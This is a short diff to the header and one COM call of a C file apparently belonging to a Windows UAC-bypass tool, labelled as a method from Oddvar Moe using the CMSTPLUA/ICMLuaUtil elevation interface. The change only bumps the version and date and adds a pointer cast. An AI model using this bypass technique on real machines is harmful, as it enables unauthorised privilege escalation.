@@ -4,9 +4,9 @@
 *
 *  TITLE:       API0CRADLE.C
 *
-*  VERSION:     3.00
+*  VERSION:     3.10
 *
-*  DATE:        25 Aug 2018
+*  DATE:        18 Nov 2018
 *
 *  UAC bypass method from Oddvar Moe aka api0cradle.
 *
@@ -52,7 +52,7 @@ BOOL ucmCMLuaUtilShellExecMethod(
             T_CLSID_CMSTPLUA,
             &IID_ICMLuaUtil,
             CLSCTX_LOCAL_SERVER,
-            &CMLuaUtil);
+            (void**)&CMLuaUtil);
 
         if (r != S_OK)
             break;
